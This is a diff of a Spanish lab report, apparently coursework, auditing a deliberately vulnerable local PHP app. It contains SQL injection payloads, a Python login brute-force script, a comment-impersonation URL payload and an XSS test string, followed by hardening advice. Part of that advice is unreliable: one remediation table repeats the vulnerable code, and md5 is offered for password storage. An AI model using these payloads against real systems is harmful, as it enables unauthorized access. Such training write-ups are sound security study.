@@ -1,414 +1,355 @@
-PROYECTO 03: TALENT SCOUTTECH
+**PROYECTO 03: TALENT SCOUTTECH**
 
-Parte 1: Inyección SQL
+# **Parte 1: Inyección SQL**
 
-a) Para ver si podía sacarle información a la base de datos sobre la consulta que estaba ejecutando, me fui directo a la página de "Insertar jugador". Lo primero que hice fue probar a enviar el formulario vacío, y luego probé metiendo una comilla simple ‘ en el usuario, dejando la contraseña en blanco. El resultado fue interesante: me dejó pasar (lo que ya nos dice que el control de acceso hace aguas), pero además escupió varios errores.
+## **a)**
 
-\!\[\]\[image1\]
+ Para provocar una respuesta que nos pueda dar una pista de cual es la consulta que se hace, he ido a la página “Insertar jugador”. He probado a no poner nada y enviar el formulario, y también a poner como usuario una sola comilla “ ‘ ”, sin poner contraseña. Esto nos da acceso, indicando que el control de acceso no funciona adecuadamente, pero además nos da algunos errores.
 
-Estos errores son oro puro. Primero, porque al romper la sintaxis sabemos seguro que no están usando sentencias preparadas. Segundo, la web se chiva de que esperaba recibir un objeto o un array de la base de datos, pero recibió un booleano (seguramente un false porque el usuario ‘ no existe). Luego intenta leer el nombre y equipo del jugador, y vuelve a fallar porque la base de datos no le ha dado nada.
+![][image1]
 
-Viendo esto, apuesto a que la consulta por detrás es algo así:
+Esto nos da algunas pistas. La primera de ellas es que esas dos entradas han roto la sintaxis de la consulta, por lo que sabemos que no se están usando sentencias preparadas. Después, nos dice que la web esperaba como respuesta de la base de datos un objeto o un array, pero se ha devuelto un booleano (false, probablemente), ya que los usuarios que hemos probado no existen. El formulario intenta entonces acceder al nombre del jugador y su equipo, pero esto también genera un error puesto que la base de datos no los ha proporcionado.
+
+Es probable que, entonces, la consulta sea:
 
 | Escribo los valores | “ ‘ ” |
 | :---- | :---- |
 | En el campo | usuario, dejando la contraseña vacía |
 | Del formulario de la página | insert\_player.php |
 | La consulta que se ejecuta es | SELECT \* FROM users WHERE username \= ‘ ’ |
-| Los campos que se utilizan en la consulta son | user, password |
+| Los campos que se utilizan en la consulta son  | user, password |
 | Los campos que no se utilizan en la consulta son |  |
 
-b) Sabiendo esto, el siguiente paso es intentar hacerme pasar por otro usuario usando un diccionario de contraseñas cortito. El problema es que no tengo ni idea de qué usuarios existen ni cómo se llaman, así que necesito un payload que "anule" la parte del nombre de usuario y se centre solo en la contraseña.
+## **b)** 
 
-Para automatizar esto, me he montado un scriptillo en Python que va probando contraseñas del diccionario junto con la inyección SQL:
+Ahora vamos a intentar impersonar a un usuario a partir de un diccionario de contraseñas pequeño. No conocemos cuántos usuarios existen en la base de datos ni el nombre de usuario de ninguno de ellos, por lo que necesitamos un payload que nos ayude a “omitir” el usuario, teniendo en cuenta lo que hemos averiguado sobre la consulta.
 
-`import urllib.parse`
+Para ello, podemos usar una herramienta como algún script personalizado que nos permita hacer un intento de entrada con el diccionario y una inyeccion sql:
 
-`import http.client`
+import urllib.parse  
+import http.client
 
-`HOST = "localhost"`
+HOST \= "localhost"  
+PATH \= "/web/insert\_player.php"  
+ERROR\_TEXT \= "invalid user or password"
 
-`PATH = "/web/insert_player.php"`
+passwords \= \[  
+    "password",  
+    "123456",  
+    "12345678",  
+    "1234",  
+    "qwerty",  
+    "dragon",  
+\]
 
-`ERROR_TEXT = "invalid user or password"`
+conn \= http.client.HTTPConnection(HOST)
 
-`passwords = [`
+for pwd in passwords:  
+    injected\_username \= '" OR 1=1 LIMIT 1 OFFSET 1 \-- \-'
 
-    `"password",`
+    body \= urllib.parse.urlencode({  
+        "username": injected\_username,  
+        "password": pwd  
+    })
 
-    `"123456",`
+    headers \= {  
+        "Content-Type": "application/x-www-form-urlencoded",  
+        "Content-Length": str(len(body)),  
+        "Host": HOST,  
+    }
 
-    `"12345678",`
+    conn.request("POST", PATH, body=body, headers=headers)  
+    resp \= conn.getresponse()  
+    resp\_body \= resp.read().decode(errors="ignore")
 
-    `"1234",`
+    print(f"\[+\] Trying '{pwd}' \-\> status {resp.status}, len={len(resp\_body)}")
 
-    `"qwerty",`
+    if ERROR\_TEXT.lower() not in resp\_body.lower():  
+        print(f"\[\!\] POSSIBLE SUCCESS with password \= '{pwd}'")  
+        break
 
-    `"dragon",`
+conn.close()
 
-`]`
+Al ejecutarlo, encontramos esta respuesta:
 
-`conn = http.client.HTTPConnection(HOST)`
+![][image2]
 
-`for pwd in passwords:`
-
-    `injected_username = '" OR 1=1 LIMIT 1 OFFSET 1 -- -'`
-
-    `body = urllib.parse.urlencode({`
-
-        `"username": injected_username,`
-
-        `"password": pwd`
-
-    `})`
-
-    `headers = {`
-
-        `"Content-Type": "application/x-www-form-urlencoded",`
-
-        `"Content-Length": str(len(body)),`
-
-        `"Host": HOST,`
-
-    `}`
-
-    `conn.request("POST", PATH, body=body, headers=headers)`
-
-    `resp = conn.getresponse()`
-
-    `resp_body = resp.read().decode(errors="ignore")`
-
-    `print(f"[+] Trying '{pwd}' -> status {resp.status}, len={len(resp_body)}")`
-
-    `if ERROR_TEXT.lower() not in resp_body.lower():`
-
-        `print(f"[!] POSSIBLE SUCCESS with password = '{pwd}'")`
-
-        `break`
-
-`conn.close()`
-
-Al lanzarlo, me devolvió esto:
-
-\!\[\]\[image2\]
-
-Así que ya tenemos una entrada válida: hay un usuario con contraseña es “1234”.
+Así que ahora sabemos que hay un usuario con contraseña “1234”
 
 | Explicación del ataque | Un ataque de fuerza bruta sencilla haciendo peticiones POST con un script de python y el diccionario provisto. |
 | :---- | :---- |
 | Usuario con el que se accede | " OR 1=1 LIMIT 1 OFFSET 1 \-- \- |
 | Contraseña con la que se accede | 1234 |
 
-c) He estado mirando la función SQLite3::escapeString() y la verdad es que no sirve de mucho aquí; la aplicación sigue expuesta. El problema es de base por un par de cosas:
+## **c) areUserAndPasswordValid**
 
-1. Mal uso de las comillas: La consulta original mete el nombre de usuario entre comillas dobles ("):  
-   WHERE username \= "' . $user . '"'  
-   Pero resulta que SQLite3::escapeString() está pensada para escapar comillas simples ('), que es lo estándar en SQL. Si yo le meto comillas dobles, la función ni se entera, me deja cerrar la cadena original y meter mi código SQL (OR 1=1...) tan a gusto.  
-2. Concatenar es mala idea: Da igual la función de escape que uses, pegar variables directamente en la consulta SQL es buscarse problemas. Siempre se te puede escapar algún carácter raro. Lo suyo es usar sentencias preparadas y olvidarse de líos, porque ahí sí que separas datos de comandos de verdad.
+El uso de SQLite3::escapeString() no evita este error, y la aplicación sigue siendo vulnerable a inyecciones sql. Esto se debe a varias razones:
 
-d) Otra cosa que vi es que para publicar comentarios como si fuera otra persona, primero necesitaba el ID del jugador. Eso es fácil, se ve en la URL nada más entrar a sus comentarios:
+1\. Uso incorrecto de delimitadores y escape: la consulta original utiliza comillas dobles (") para delimitar el valor del usuario:
 
-[http://localhost/web/show\_comments.php?id=3](http://localhost/web/show_comments.php?id=3)
+**WHERE username \= "' . $user . '"'**
 
-Me puse a cotillear el código de add\_comment.php y vi la consulta que guarda los comentarios:
+La función SQLite3::escapeString() está diseñada principalmente para escapar comillas simples ('), que son el estándar SQL para cadenas de texto. Al usar comillas dobles en la consulta, escapeString no neutraliza el carácter (") inyectado por el atacante. Esto permite que el payload " OR 1=1 ... cierre la cadena de texto original y ejecute comandos SQL en favor del auditor.
 
-INSERT INTO comments (playerId, userId, body) VALUES ('".$\_GET\['id'\]."', '".$\_COOKIE\['userId'\]."', '$body');
+2\. Concatenación vs. Parametrización: independientemente de la función de escape, concatenar variables directamente en una sentencia SQL es una mala práctica. Cualquier fallo en la lógica de escape o en la elección de delimitadores deja la puerta abierta a la inyección. Es por eso que lo más recomendable es usar sentencias preparadas, que no permiten las inyecciones de SQL.
 
-Aquí el fallo es garrafal: coge el parámetro id directamente de la URL (GET) y lo mete en la base de datos sin preguntar. Ni validación ni nada. Esto me permite inyectar SQL para cambiar no solo el ID del jugador, sino también el userId, que es quien supuestamente escribe el comentario.
+## **d) fuerza bruta sobre directorios**
 
-Para confirmar esto, usé fuzzing y encontré una copia del archivo llamada add\_comment.php\~.
+Para publicar comentarios en nombre de otros usuarios, primero tendremos que encontrar el id de la jugadora. Esto es visible al observar la url al entrar en su sección de comentarios:
 
-Básicamente, modificando el id en la URL puedo cerrar la consulta original y meter mis propios datos. Si quiero publicar un comentario haciéndome pasar por el usuario con ID 1 (que podría ser el admin), meto este payload:
+**http://localhost/web/show\_comments.php?id=3**
 
-3', '1', 'Es la leche') \-- \-  
-La URL completa quedaría así: 
+Analizamos el código fuente de add\_comment.php y vemos que la aplicación utiliza la siguiente consulta SQL para guardar comentarios:
 
-[http://localhost/web/add\\\_comment.php?id=3](http://localhost/web/add%5C_comment.php?id=3)
+**INSERT INTO comments (playerId, userId, body) VALUES ('".$\_GET\['id'\]."', '".$\_COOKIE\['userId'\]."', '$body');**
 
-', '1', 'es la leche') \-- \-
+El parámetro id, que se recibe por GET, se inserta directamente en la consulta SQL sin ningún tipo de validación ni limpieza previa. Esto permite a un atacante manipular tanto el playerId como el userId del comentario mediante inyección SQL.
+
+Para explotarlo, localizamos el archivo de copia add\_comment.php\~ mediante fuzzing de directorios.
+
+Se analiza la consulta SQL y se detecta que el parámetro id se usa directamente sin filtrar.
+
+Se modifica el valor de id en la misma URL.
+
+El comentario se guarda en la base de datos con un userId diferente al del usuario autenticado.
+
+Para publicar un comentario en nombre de otro usuario (por ejemplo, con userId \= 1), se modifica el parámetro id en la URL introduciendo el siguiente payload:
+
+**3', '1', 'Es la leche') \-- \-**  
+La URL resultante sería http://localhost/web/add\_comment.php?id=3', '1', 'es la leche') \-- \-
 
 | vulnerabilidad | Inyección SQL en el parámetro id al mandarlo por GET. |
 | :---- | :---- |
-| descripción del ataque | Se cambia el parámetro ID |
+| descripción del ataque | Se cambia el parámetro ID  |
 | cómo hacer segura esta sección: | Usar consultas preparadas. |
 
-Parte 2: XSS
+​
 
-1\) Comprobar XSS en los comentarios
+# **Parte 2: XSS**
 
-Para ver si podía colar código JavaScript (Cross Site Scripting), probé lo típico: meter un script en la caja de comentarios a ver si se ejecutaba.  
-Escribí esto:
+1) ## **Comprobar xss en apartado de comentarios:**
+
+Para comprobar si la aplicación es vulnerable a Cross Site Scripting, podemos probar a introducir código JS en el campo de “comentario”   
+El siguiente mensaje se introduce como comentario:
 
 \<script\>alert('test xss');\</script\>  
-\!\[\]\[image3\]
+![][image3]
 
-Y efectivamente, al volver a entrar en los comentarios de "Candela", saltó la ventanita:
+Y al entrar otra vez en la sección de comentarios de la jugadora “Candela”, encontramos esto:
 
-\!\[\]\[image4\]
+![][image4]
 
-Esa alerta confirma el XSS. El navegador se come el código JS y lo ejecuta sin rechistar porque la aplicación no está filtrando nada de lo que entra.
+La alerta de JS nos indica que existe una vulnerabilidad a XSS, ya que el código JS se ejecuta sin problemas, por lo que no se está filtrando ni protegiendo contra su inyección.
 
 | Introduzco el mensaje | \<script\>alert('test xss');\</script\> |
-| :---- | :---- |
+| ----- | ----- |
 | En el formulario de la página | add\_comment.php |
 
-Por cierto, mirando el código vi que los enlaces con varios parámetros GET tienen una pinta curiosa. Por ejemplo, el de donación.
+2) ## **\&amp en lugar de &**
 
-2\) ¿Por qué usar \&amp; en vez de &?
+La razón es puramente de sintaxis y validación HTML. En el lenguaje HTML, el carácter & (ampersand) es un carácter reservado que se utiliza para iniciar elementos HTML (secuencias especiales como \&lt; para \<, \&gt; para \>, o \&quot; para ").
 
-Esto no es un fallo, es simplemente que HTML es así de especial. El símbolo & está reservado para empezar "entidades" (como \&lt; para poner un \<).
+Si escribiéramos un & directamente dentro del atributo href (por ejemplo, ?param1=a\&param2=b), el navegador podría confundirse e intentar interpretar lo que sigue como un elemento HTML. Si lo que sigue no es una entidad válida, algunos navegadores podrían romper la URL o renderizar incorrectamente el resto del código.
 
-Si pones un & a pelo en un enlace (href="...?a=1\&b=2"), el navegador se puede liar e intentar interpretar lo que viene después como un código especial. Si no es un código válido, a veces rompe la URL o se ve mal.  
-Por eso, para hacerlo bien según el estándar, hay que escribir \&amp;. El navegador ya sabe que eso significa un & normal y corriente y envía la URL bien al servidor.
+Entonces, para cumplir con el estándar HTML y evitar errores de interpretación, el carácter & debe escribirse como \&amp; dentro de los atributos.
 
-| Campo | Respuesta |
-| :---- | :---- |
 | Explicación | El & se codifica como \&amp; para que el parser HTML no lo confunda con el inicio de una entidad especial. El navegador se encarga de decodificarlo automáticamente al hacer clic, enviando la URL correcta con & al servidor. |
+| :---- | :---- |
 
-c) El problema de show\_comments.php y cómo arreglarlo
+3) ## **Problema en show\_comments.php y su corrección**
 
-Echando un ojo a show\_comments.php, vi que el problema es que saca los comentarios de la base de datos y los planta en la pantalla tal cual, sin limpiar nada.
+Al revisar el código fuente del archivo show\_comments.php, nos encontramos con que los comentarios se extraen de la base de datos y se muestran directamente en el navegador del usuario sin ningún tipo de limpieza o validación. Lo podriamos hacer así:
 
-Mira este trozo de código:  
 $query \= "SELECT \* FROM comments WHERE playerId \= ".$\_GET\['id'\];  
 $result \= $db-\>query($query);
 
 while ($row \= $result-\>fetchArray()) {  
-// VULNERABILIDAD: Se imprime el cuerpo del comentario directamente  
-echo "Comment: " . $row\['body'\];  
+    *// el problema es que se imprime el cuerpo directamente, creo*  
+    echo "Comment: " . $row\['body'\];   
 }
 
-La web se fía demasiado de lo que hay en la columna body. Como yo ya había guardado mi script malicioso antes, al llegar aquí, show\_comments.php lo imprime y el navegador lo ejecuta pensando que es código suyo. Eso es un XSS de manual.
+La aplicación confía ciegamente en el contenido guardado en la columna body de la tabla comments. Si un atacante ha logrado guardar un script malicioso (como vimos en el apartado anterior con \<script\>alert('XSS')\</script\>), show\_comments.php lo imprimirá tal cual. El navegador interpretará ese texto como código HTML/JavaScript ejecutable en lugar de como texto plano, disparando el ataque XSS (Cross-Site Scripting).
 
-La solución:  
-Hay que tratar cualquier cosa que venga de la base de datos como "texto peligroso" antes de ponerlo en el HTML.  
-En PHP tenemos htmlspecialchars(), que convierte los caracteres conflictivos (\<, \>, comillas) en su versión inofensiva de texto (\&lt;, etc.). Así se ve el código del script en pantalla, pero no se ejecuta.
+Para arreglar esto, tendremos que asegurarnos de que cualquier dato que provenga de la base de datos sea tratado como texto seguro antes de mostrarlo en el HTML.
 
-El código seguro sería:
-*`// Solución: Envolver la salida con htmlspecialchars`*
+La corrección es usar la función htmlspecialchars() de PHP, que convierte los caracteres especiales (como \<, \>, &, ", ') en sus correspondientes entidades HTML (\&lt;, \&gt;, etc.). De esta forma, el navegador mostrará el script como texto visible pero no lo ejecutará.
 
-`echo "Comment: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');`
+echo "Comment: " . htmlspecialchars($row\['body'\], ENT\_QUOTES, 'UTF-8');
 
-| Vulnerabilidad | Stored XSS (Cross-Site Scripting Almacenado) |
+| Problema | Stored XSS (Cross-Site Scripting Almacenado) |
 | :---- | :---- |
-| Causa | Falta de sanitización de salida al imprimir variables de la base de datos. |
-| Solución | Implementar htmlspecialchars($variable, ENT\_QUOTES, 'UTF-8') en todas las salidas de datos. |
+| Solución | Cambio el codigo actual por: $query \= "SELECT \* FROM comments WHERE playerId \= ".$\_GET\['id'\]; $result \= $db-\>query($query); while ($row \= $result-\>fetchArray()) {     *// el problema es que se imprime el cuerpo directamente*     echo "Comment: " . $row\['body'\];  |
 
-d) No es el único sitio: también pasa en list\_players.php
+4) ##  **Otras páginas vulnerables a XSS**
 
-Me puse a buscar si había más sitios con este problema, revisando todos los archivos PHP que pintan datos del usuario. Básicamente busqué cualquier echo que no tuviera el htmlspecialchars.
+Para descubrir si hay más páginas afectadas por esta vulnerabilidad, he revisado todos los archivos PHP de la aplicación que muestran datos introducidos por los usuarios. La forma ha sido buscar en el código fuente cualquier "echo" o "print" que imprima variables sin usar "htmlspecalchars".
 
-Y encontré otro en list\_players.php.
+Tras este análisis, he descubierto que el archivo list\_players.php también es vulnerable.  
+En list\_players.php, el código muestra una lista de jugadores con sus nombres y equipos. Al revisar el código fuente de este archivo, se observa que los nombres de los jugadores y sus equipos se imprimen directamente desde la base de datos sin limpieza de los datos. El codigo débil es:
 
-En este archivo se listan los jugadores y sus equipos, y pasa lo mismo: se imprimen los datos a pelo desde la base de datos.
+echo "Name: " . $row\['name'\] . "  
+";  
+echo "Team: " . $row\['team'\] . "  
+";
 
-echo "Name: " . $row\['name'\] . "\<br\>";  
-echo "Team: " . $row\['team'\] . "\<br\>";
+Esto significa que si un atacante consigue registrar un jugador con un nombre malicioso (por ejemplo, inyectando un script en el campo "name" durante el registro o creación del jugador), ese script se ejecutará automáticamente en el navegador de cualquier persona que visite la lista de jugadores.
 
-Esto es peligroso porque si consigo registrar un jugador con un nombre "trucado" (metiendo un script en el campo nombre), cualquiera que entre a ver la lista de jugadores se va a comer mi script.  
-Así que el XSS no está solo en los comentarios. La solución es la misma: ponerle htmlspecialchars() a todo lo que salga en list\_players.php.
+Por lo tanto, la vulnerabilidad de XSS Almacenado no se limita solo a los comentarios, sino que afecta a cualquier parte de la aplicación donde se muestren datos de usuario sin filtrar. La solución es la misma que en el apartado de antes: aplicar "htmlspecialchars()" a todas las salidas de datos en list\_players.php.
 
-| Página adicional afectada | list\_players.php |
+| Otras paginas afectadas… | list\_players.php |
 | :---- | :---- |
-| Datos vulnerables | Campos 'name' y 'team' de los jugadores. |
-| Método de descubrimiento | Revisión de código fuente (Source Code Review) buscando salidas de datos sin escapar. |
+| ¿Cómo lo he descubierto? | Búsqueda de entradas de datos sin protección |
 
-Parte 3: Control de acceso, autenticación y sesiones de usuarios
+# **Parte 3: Control de acceso, autenticación y sesiones de usuarios**
 
-a) Asegurando el registro (register.php)
+1) ##  **Medidas de seguridad en el registro de usuarios**
 
-Tal y como está ahora, register.php es un coladero. Te deja crear usuarios sin comprobar nada, lo que invita a llenarlo de cuentas falsas, meter más inyecciones SQL o usar contraseñas ridículas.
+En el archivo register.php, el código permite registrar usuarios sin ninguna validación de seguridad, lo que expone la aplicación a múltiples riesgos como la creación masiva de cuentas falsas, inyecciones SQL (si no se corrigen en el insert o se preparan las sentencias) y el uso de contraseñas débiles.  
+A continuación veamos las medidas necesarias para asegurar este proceso:  
+1\. Validación de datos:  
+Tenemos que validar que los datos recibidos (usuario, email, contraseña,etc.) cumplan con un formato esperado antes de procesarlos.
 
-Para adecentarlo un poco habría que hacer esto:
+* El email debe ser válido (filter\_var($email, FILTER\_VALIDATE\_EMAIL)), por ejemplo.  
+* El nombre de usuario debe contener solo caracteres permitidos (alfanuméricos).  
+* Se deben usar consultas preparadas para la inserción en la base de datos, evitando inyecciones SQL.​
 
-1. Validar lo que entra: No te puedes fiar de lo que manda el usuario. Hay que comprobar que el email parece un email de verdad (filter\_var) y que el nombre de usuario solo tiene letras y números. Y por supuesto, usar sentencias preparadas para guardar los datos, que ya hemos visto lo que pasa si no.  
-2. Contraseñas serias: Nada de guardar contraseñas en texto plano. Hay que hashearlas con algo robusto como password\_hash() (Bcrypt o Argon2). Y obligar a que tengan una longitud mínima y caracteres variados para que no las revienten con fuerza bruta en dos minutos.  
-3. Frenar a los bots: Si no ponemos un CAPTCHA, cualquier script puede crearnos mil usuarios en un segundo.  
-4. Confirmar el email: Lo ideal sería enviar un correo con un link para activar la cuenta, así nos aseguramos de que el correo existe.
+2\. Políticas de contraseñas robustas:  
+No se debe permitir cualquier contraseña. Se debe exigir una longitud mínima (ej. 8-12 caracteres) y estructura (uso de mayúsculas, números y símbolos) para dificultar ataques de fuerza bruta. Además, nunca se deben guardar en texto plano; se debe usar password\_hash() o md5, pero este ultimo no es ideal porque hay diccionarios de claves ya encriptadas.​
 
-Como estamos en un entorno de pruebas y no tenemos servidor de correo, lo crítico que sí o sí hay que implementar ya es la validación y el hash de contraseñas:
+2) ##  **Mejoras en el sistema de Login**
 
-*`// Ejemplo de implementación segura (simplificado)`*
+El sistema de login (auth.php) tiene debilidades importantes, como el almacenamiento inseguro de credenciales en cookies y la falta de protección contra ataques de fuerza bruta.
 
-`$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_SPECIAL_CHARS);`
+Podemos implementar:
 
-`$password = $_POST['password'];`
+1\. Almacenamiento seguro de sesiones:  
+Actualmente se guardan el usuario y la contraseña en cookies ($\_COOKIE\['user'\], $\_COOKIE\['password'\]), lo cual es una vulnerabilidad grave. Si alguien intercepta estas cookies o accede al navegador, obtiene las credenciales en texto plano.  
+La solución es usar Sesiones PHP ($\_SESSION). Al logearse, solo se guarda un ID de sesión en la cookie (PHPSESSID), mientras que los datos del usuario se mantienen en la memoria del servidor.​
 
-`if (strlen($password) < 8) {`
+2\. Protección contra Fuerza Bruta:  
+Se debe limitar el número de intentos de inicio de sesión fallidos desde una misma IP o cuenta. Por ejemplo, tras 5 intentos fallidos, bloquear el acceso durante 15 minutos.​
 
-    `die("La contraseña debe tener al menos 8 caracteres.");`
+Por ejemplo, podemos modificar auth.php para usar $\_SESSION y quitar datos sensibles, como contraseñas, de las cookies.
 
-`}`
+session\_start();  
+$\_SESSION\['user\_id'\] \= $user\['id'\];  
+$\_SESSION\['username'\] \= $user\['username'\];  
+session\_regenerate\_id(true); 
 
-*`// Hash seguro antes de guardar`*
+3) ##  **Gestión del acceso a register.php**
 
-`$passwordHash = password_hash($password, PASSWORD_DEFAULT);`
+El archivo register.php es accesible públicamente. En un entorno corporativo o privado como el de esta empresa, esto no debería permitirse sin control.
 
-*`// Inserción segura con Prepared Statement`*
+Medidas de control:
 
-`$stmt = $db->prepare("INSERT INTO users (username, password, email) VALUES (:user, :pass, :email)");`
+1\. Acceso restringido por rol:  
+Si solo los administradores deben crear usuarios, se debe verificar al inicio del archivo si el usuario actual tiene permisos de administrador. Si no, redirigir al login.
 
-`$stmt->bindValue(':user', $username);`
+2\. Registro por invitación (Token):  
+Si el registro debe ser público pero controlado, se puede implementar un sistema de tokens. register.php solo debería cargar si recibe un token válido por URL (register.php?token=xyz123), previamente generado por un administrador.
 
-`$stmt->bindValue(':pass', $passwordHash);`
+Implementación factible:  
+Añadir una verificación de sesión al inicio de register.php para que solo usuarios autenticados (o admins) puedan acceder.
 
-*`// ... bind de email ...`*
+session\_start();  
+if (\!isset($\_SESSION\['user\_id'\])) {  
+    header("Location: index.php");  
+    exit();  
+}
 
-`$stmt->execute();`
+4) ## **Protección de la carpeta private**
 
-b) Arreglando el Login (auth.php)
+Aunque asumimos que la carpeta private no es accesible, en una configuración por defecto de Apache/XAMPP, si se navega a http://localhost/web/private/, el servidor podría mostrar el contenido de los archivos o permitir su descarga si no tienen extensión .php ejecutable.
 
-El sistema de login actual da miedo. Guarda el usuario y la contraseña tal cual en las cookies.
+¿Se cumple la condición de inaccesibilidad?  
+Localmente, NO se cumple por defecto. Cualquier archivo en esa carpeta es accesible vía navegador a menos que el servidor web esté configurado explícitamente para denegarlo.
 
-Esto es lo que hay que cambiar:
+Medidas de protección:
 
-1. Sesiones de verdad: Guardar credenciales en cookies ($\_COOKIE) es regalar la cuenta. Si alguien ve esa cookie, tiene la contraseña. Hay que usar sesiones de PHP ($\_SESSION). Así, en el navegador del usuario solo queda un ID de sesión (el famoso PHPSESSID) y los datos importantes se quedan seguros en el servidor.  
-2. Fuerza bruta: Hay que poner un límite. Si alguien falla 5 veces seguidas, se le bloquea un rato.  
-3. Cambiar el ID de sesión: Justo después de loguearse, hay que regenerar el ID de sesión (session\_regenerate\_id). Esto evita que alguien te "preste" una sesión fijada y luego se meta en tu cuenta.
+1\. Uso de .htaccess (Apache):  
+Crear un archivo .htaccess dentro de la carpeta private con la directiva Deny from all. Esto le dice al servidor web que rechace cualquier petición HTTP hacia esa carpeta, aunque los scripts PHP sí pueden incluir (include/require) esos archivos internamente.​
 
-Lo que hay que tocar en auth.php:
+2\. Mover fuera del Web Root:  
+La medida más segura es mover la carpeta private a un nivel superior al directorio público (public\_html o htdocs). De esta forma, es físicamente imposible acceder a ella desde una URL.
 
-`session_start();`
+Implementación:  
+Crear un archivo llamado .htaccess en la carpeta private con el siguiente contenido:
 
-*`// Al loguearse correctamente:`*
+Order Deny,Allow  
+Deny from all
 
-`$_SESSION['user_id'] = $user['id'];`
+5) ##  **Análisis del flujo de sesión**
 
-`$_SESSION['username'] = $user['username'];`
+Estado actual:  
+El flujo actual es inseguro porque depende de cookies manipulables por el cliente ($\_COOKIE\['userId'\]) para mantener la sesión y verificar la identidad en cada petición.
 
-*`// Regenerar ID para seguridad`*
+Análisis de suplantación:  
+Como vimos en el apartado de XSS y SQLi, si un atacante obtiene o modifica la cookie userId, puede suplantar a cualquier usuario sin necesidad de contraseña (Session Hijacking / Insecure Direct Object Reference).
 
-`session_regenerate_id(true);`
+Acciones de mejora:  
+Implementar un control de sesiones robusto basado en el servidor:
 
-*`// Eliminar lógica de cookies inseguras`*
+1. Validar sesión en cada página: Crear un archivo check\_session.php que se incluya al principio de cada script protegido.  
+2. Verificar inactividad: Implementar un timeout (ej. 30 minutos). Si el usuario no interactúa, destruir la sesión.  
+3. Cookies HttpOnly y Secure: Configurar PHP para que la cookie de sesión (PHPSESSID) tenga los flags HttpOnly (para que JS no pueda leerla, mitigando XSS) y Secure (solo HTTPS).​  
+   
 
-*`// setcookie('password', ...); // ELIMINAR ESTO`*
+session\_set\_cookie\_params(\[  
+    'lifetime' \=\> 1800, *// 30 minutos*  
+    'path' \=\> '/',  
+    'domain' \=\> 'localhost',  
+    'secure' \=\> true, *// Solo HTTPS*  
+    'httponly' \=\> true, *// No accesible por JS*  
+    'samesite' \=\> 'Strict'  
+\]);  
+session\_start();
 
-c) Quién entra a register.php
+# **Parte 4 \- Servidores web**
 
-Ahora mismo register.php está abierto a todo el mundo. En una empresa como Talent ScoutTech esto no tiene sentido.
+En este caso, para una app hecha en php con apache, tenemos muchas brechas que tener en cuenta, ya que PHP es inseguro por naturaleza. Hay muchas opciones a la hora de mejorar la seguridad del servidor, pero lo más común y obvio es:
 
-Lo suyo sería:
+1) ##  **Ocultación de información del servidor**
 
-1. Solo admins: Poner un chequeo al principio del archivo. Si no eres admin, te manda al login.  
-2. Por invitación: Si queremos que sea público pero controlado, podríamos usar tokens en la URL que solo un admin pueda generar.
+Por defecto, Apache muestra su versión, sistema operativo y módulos instalados en las cabeceras HTTP y en las páginas de error (ej. 404). Esta información es oro para un atacante, ya que le permite buscar exploits específicos para esas versiones (CVEs conocidos).
 
-Lo más rápido y efectivo ahora es poner la verificación de sesión:
+Editar el archivo de configuración principal de Apache (httpd.conf o apache2.conf) y añadir o modificar las siguientes directivas:
 
-`session_start();`
+* ServerTokens Prod: Configura el servidor para que solo diga "Apache" en la cabecera, sin mostrar la versión ni el sistema operativo, porque esto revela mucha información que nos debilita, incluso si tenemos mucha seguridad implementada.  
+* ServerSignature Off: Elimina la firma del servidor (esa línea que dice "Apache/2.4.41 (Ubuntu) Server at localhost Port 80") que aparece al final de las páginas de error generadas automáticamente.
 
-`if (!isset($_SESSION['user_id'])) {`
+2) ##  **Deshabilitar el listado de directorios (Directory Listing)**
 
-    `header("Location: index.php");`
+Si un usuario accede a una carpeta que no tiene un archivo index.php o index.html (como podría ser la carpeta de imágenes o css/), Apache por defecto muestra una lista de todos los archivos contenidos en ella. Esto expone la estructura interna de la aplicación y puede revelar archivos sensibles
 
-    `exit();`
+Podemos desactivar el módulo mod\_autoindex o usar la directiva Options \-Indexes en la configuración global o en el archivo .htaccess de la raíz:
 
-`}`
+\<Directory /var/www/html\>  
+    Options \-Indexes  
+\</Directory\>
 
-*`// Resto del código de registro...`*
+3) ##  **Configuración de cabeceras de seguridad HTTP**
 
-d) Escondiendo la carpeta private
+Las cabeceras HTTP pueden instruir al navegador del usuario para que active protecciones contra ciertos ataques.
 
-Se supone que la carpeta private es secreta, pero en una instalación normal de Apache, si entras a http://localhost/web/private/ y no hay un index.php, te lista todos los archivos que hay. Y te los puedes descargar.
+Podemos añadir las siguientes cabeceras en la configuración de Apache (requiere mod\_headers):
 
-Para blindar esto:
+* X-Frame-Options: SAMEORIGIN: Impide que la web se cargue dentro de un \<iframe\> en otro sitio, protegiendo contra ataques de Clickjacking.  
+* X-Content-Type-Options: nosniff: Evita que el navegador intente "adivinar" el tipo de archivo (MIME-sniffing), forzándolo a respetar el Content-Type declarado. Esto ayuda a mitigar ataques donde se suben archivos maliciosos camuflados.  
+* Strict-Transport-Security (HSTS): Si se usa HTTPS (obligatorio en producción), esta cabecera fuerza a los navegadores a conectarse siempre de forma segura, evitando ataques de Downgrade.
 
-1. .htaccess al rescate: Crear un archivo .htaccess dentro de esa carpeta que diga Deny from all. Así, si intentas entrar por navegador te da error, pero los scripts de PHP pueden seguir usando esos archivos por dentro.  
-2. Sacarla de ahí: Lo mejor sería mover esa carpeta fuera de donde publica la web (public\_html). Si no está en la carpeta pública, no hay URL que valga para llegar a ella.
+4) ## **Protección de archivos sensibles**
 
-La solución del .htaccess es muy fácil de aplicar:
+Como creo que vimos en el apartado 1d, los archivos de respaldo (.php\~, .bak, .sql) son una fuente crítica de información.
 
-`# Bloquear acceso web a todos los archivos`
+Podemos configurar Apache para denegar el acceso a estos archivos mediante una directiva FilesMatch:
 
-`Order Deny,Allow`
+\<FilesMatch "(\\.(bak|config|sql|ini|log|sh|inc|swp)|\~)$"\>  
+    Order allow,deny  
+    Deny from all  
+    Satisfy All  
+\</FilesMatch\>
 
-`Deny from all`
-
-e) El problema de la sesión actual
-
-Ahora mismo la web se fía de la cookie userId. Si yo edito mis cookies en el navegador y me cambio ese número, la web se cree que soy otro usuario. Eso es un robo de sesión (Session Hijacking) de libro.
-
-Para arreglarlo hay que pasar todo al lado del servidor:
-
-1. Checkear sesión siempre: Tener un check\_session.php que verifique que la sesión es válida en cada página.  
-2. Caducidad: Si el usuario se va a comer y deja la sesión abierta, que se cierre sola a los 30 minutos.  
